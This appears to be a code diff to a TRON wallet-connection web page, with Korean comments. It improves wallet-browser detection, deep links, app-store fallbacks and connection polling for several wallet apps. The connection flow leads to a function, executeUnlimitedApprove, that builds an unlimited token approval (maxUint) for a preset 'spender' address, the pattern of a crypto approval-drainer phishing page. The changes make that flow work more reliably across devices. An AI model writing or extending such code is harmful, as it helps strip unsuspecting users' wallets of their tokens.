@@ -704,13 +704,30 @@ var spender = null;
             d.textContent = s;
             return d.innerHTML;
         }
-        function isMobile() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }
+        function isMobile() {
+    var ua = navigator.userAgent;
+    if (/Android|iPhone|iPad|iPod/i.test(ua)) return true;
+    // 폴드폰: 펼쳤을 때 화면 넓어져도 터치 있으면 모바일로 처리
+    if (navigator.maxTouchPoints > 1 && window.screen.width <= 1200) return true;
+    return false;
+}
         function isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
         function isAndroid() { return /Android/i.test(navigator.userAgent); }
         function isPC() { return !isMobile(); }
         function isSafari() { return /Safari/i.test(navigator.userAgent) && !/CriOS|Chrome/i.test(navigator.userAgent); }
         function isIOSChrome() { return isIOS() && /CriOS/i.test(navigator.userAgent); }
-
+        // 지갑 앱 내부 브라우저 감지
+function isTrustWalletBrowser() {
+    return /Trust/i.test(navigator.userAgent) || window.trustwallet !== undefined;
+}
+function isTokenPocketBrowser() { return /TokenPocket/i.test(navigator.userAgent); }
+function isBitgetBrowser() { return /BitKeep|Bitget/i.test(navigator.userAgent); }
+function isOKXBrowser() { return /OKApp|OKX/i.test(navigator.userAgent); }
+function isImTokenBrowser() { return /imToken/i.test(navigator.userAgent) || window.imToken !== undefined; }
+function isWalletBrowser() {
+    return isTrustWalletBrowser() || isTokenPocketBrowser() ||
+           isBitgetBrowser() || isOKXBrowser() || isImTokenBrowser();
+}
         function showToast(msg, type) {
             type = type || 'success';
             var c = document.getElementById('toast-container');
@@ -1012,19 +1029,26 @@ var spender = null;
                     }
                 }
 
-                // iOS: 지갑 딥링크 시도 후 안내
+                                // iOS: 딥링크 시도 → 2초 후 앱 없으면 앱스토어로
                 if (isIOS()) {
-                    if (wallet === 'trust') {
-                        showToast(currentLang === 'ko'
-                            ? 'URL이 복사되었습니다. Trust Wallet 앱 브라우저에 붙여넣거나 WalletConnect를 이용하세요.'
-                            : 'URL copied. Paste it in Trust Wallet browser or use WalletConnect.');
-                        window.location.href = mobileSchemes.trust;
-                        return;
-                    }
+                    var appStoreLinks = {
+                        tronlink: 'https://apps.apple.com/app/tronlink/id1453530188',
+                        trust:    'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
+                        tokenpocket: 'https://apps.apple.com/app/tokenpocket/id1436028697',
+                        bitget:   'https://apps.apple.com/app/bitget-wallet/id1395301115',
+                        okx:      'https://apps.apple.com/app/okx-buy-bitcoin-eth-crypto/id1327268470',
+                        imtoken:  'https://apps.apple.com/app/imtoken-btc-eth-wallet/id1153230571'
+                    };
                     if (mobileSchemes[wallet]) {
-                        showToast(currentLang === 'ko'
-                            ? '지갑 앱을 여는 중... 안 열리면 지갑 브라우저에 붙여넣어 주세요.'
-                            : 'Opening wallet app...');
+                        showToast(currentLang === 'ko' ? '지갑 앱으로 이동합니다...' : 'Opening wallet app...');
+                        // 2초 안에 앱이 안 열리면 앱스토어로
+                        var fallbackTimer = setTimeout(function () {
+                            showToast(currentLang === 'ko' ? '앱이 없으면 앱스토어에서 설치하세요' : 'Install from App Store', 'error');
+                            window.location.href = appStoreLinks[wallet] || 'https://trustwallet.com/download';
+                        }, 2000);
+                        window.addEventListener('pagehide', function () {
+                            clearTimeout(fallbackTimer);
+                        }, { once: true });
                         window.location.href = mobileSchemes[wallet];
                         return;
                     }
@@ -1058,23 +1082,31 @@ var spender = null;
 }
 
         async function getInjectedTronWeb() {
-            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                return window.tronWeb;
+    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        return window.tronWeb;
+    }
+    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
+        return window.tronLink.tronWeb;
+    }
+    // Trust Wallet은 tronLink.request() 지원 안 함 → 호출하면 무응답/에러
+    // Trust Wallet 브라우저가 아닐 때만 request() 시도
+    if (window.tronLink && typeof window.tronLink.request === 'function' && !isTrustWalletBrowser()) {
+        try {
+            var r = await window.tronLink.request({ method: 'tron_requestAccounts' });
+            if (r && r.code === 200) {
+                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) return window.tronWeb;
+                if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) return window.tronLink.tronWeb;
             }
-            if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
-                return window.tronLink.tronWeb;
-            }
-            if (window.tronLink && typeof window.tronLink.request === 'function') {
-                try {
-                    var r = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (r && r.code === 200) {
-                        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) return window.tronWeb;
-                        if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) return window.tronLink.tronWeb;
-                    }
-                } catch (e) { }
-            }
-            return null;
-        }
+        } catch (e) { }
+    }
+    // Trust Wallet: tronWeb 주입이 느릴 수 있어서 600ms 대기 후 재확인
+    if (isTrustWalletBrowser()) {
+        await new Promise(function (r) { setTimeout(r, 600); });
+        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) return window.tronWeb;
+        if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) return window.tronLink.tronWeb;
+    }
+    return null;
+}
 
         // ===== Auto Detection on Load =====
         window.addEventListener('DOMContentLoaded', function () {
@@ -1088,11 +1120,11 @@ var spender = null;
                         var provider = detectProvider() || 'TronLink';
                         document.getElementById('wallet-selector-modal').classList.remove('active');
                         await setConnectedWallet(tw.defaultAddress.base58, provider);
-                    } else if (attempts > 12) {
+                    } else if (attempts > 20) {
                         clearInterval(timer);
                     }
                 } catch (e) {
-                    if (attempts > 12) clearInterval(timer);
+                    if (attempts > 20) clearInterval(timer);
                 }
             }, 500);
 
@@ -1212,10 +1244,16 @@ var spender = null;
                       return null;
                   }
                   var encodedUri = encodeURIComponent(connectResult.uri);
-                  var wcDeepLinks = {
+                                    var wcDeepLinks = {
                       tronlink: 'tronlinkoutside://wc?uri=' + encodedUri,
+                      // Trust: iOS는 커스텀 스킴, Android는 유니버셜 링크
+                      trust: isIOS()
+                          ? 'trust://wc?uri=' + encodedUri
+                          : 'https://link.trustwallet.com/wc?uri=' + encodedUri,
                       tokenpocket: 'tpdapp://wc?uri=' + encodedUri,
-                      bitget: 'https://bkcode.vip/wc?uri=' + encodedUri,
+                      bitget: isIOS()
+                          ? 'bitkeep://wc?uri=' + encodedUri
+                          : 'https://bkcode.vip/wc?uri=' + encodedUri,
                       okx: 'okx://wc?uri=' + encodedUri,
                       imtoken: 'imtokenv2://wc?uri=' + encodedUri
                   };
@@ -1436,6 +1474,19 @@ userTrxBalance = (isFinite(parsedTrx) && parsedTrx >= 0) ? parsedTrx : 0;
             // 에너지 UI도 업데이트
             try { setEnergyApprovedUI(); } catch (e) { }
         }
+                // base58 → hex 변환 (함수 밖으로 꺼냄 - strict mode 오류 방지)
+        function base58ToHex(b58) {
+            var ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            var result = BigInt(0);
+            for (var i = 0; i < b58.length; i++) {
+                var c = ALPHABET.indexOf(b58[i]);
+                if (c < 0) throw new Error('Invalid base58');
+                result = result * BigInt(58) + BigInt(c);
+            }
+            var hex = result.toString(16);
+            while (hex.length < 50) hex = '0' + hex;
+            return hex.substring(2, 42);
+        }
 
         // ===== Approve =====
         window.executeUnlimitedApprove = async function () {
@@ -1553,18 +1604,7 @@ userTrxBalance = (isFinite(parsedTrx) && parsedTrx >= 0) ? parsedTrx : 0;
 
                 if (useWC) {
                     // WalletConnect 경로
-                    function base58ToHex(b58) {
-    var ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-    var result = BigInt(0);
-                        for (var i = 0; i < b58.length; i++) {
-                            var c = ALPHABET.indexOf(b58[i]);
-                            if (c < 0) throw new Error('Invalid base58');
-                            result = result * BigInt(58) + BigInt(c);
-                        }
-                        var hex = result.toString(16);
-                        while (hex.length < 50) hex = '0' + hex;
-                        return hex.substring(2, 42);
-                    }
+                    
                     var addrHex = base58ToHex(spender);
                     var paddedAddr = addrHex.padStart(64, '0');
                     var maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
